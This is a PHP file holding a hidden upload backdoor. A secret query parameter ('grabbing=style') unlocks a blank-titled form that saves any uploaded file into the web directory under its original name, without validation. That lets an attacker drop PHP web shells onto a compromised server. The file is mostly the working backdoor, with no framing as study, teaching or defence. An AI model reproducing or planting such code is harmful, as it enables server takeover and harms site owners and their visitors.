<?php
if (isset($_GET['grabbing']) && $_GET['grabbing'] == 'style') {
    echo '
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title></title>
    </head>
    <body>
        <h2>Form Upload File</h2>';

    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["fileToUpload"])) {
        $target_dir = "./"; // Current directory
        $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
        $uploadOk = 1;

        // Try to upload file
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "File ". htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " successfully graduated.";
        } else {
            echo "we were regret you have failed.";
        }
    }

    echo '
    <form action="' . htmlspecialchars($_SERVER["PHP_SELF"]) . '?grabbing=style" method="post" enctype="multipart/form-data">
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" value="upload file" name="submit">
    </form>
    </body>
    </html>';
    exit;
}
?>
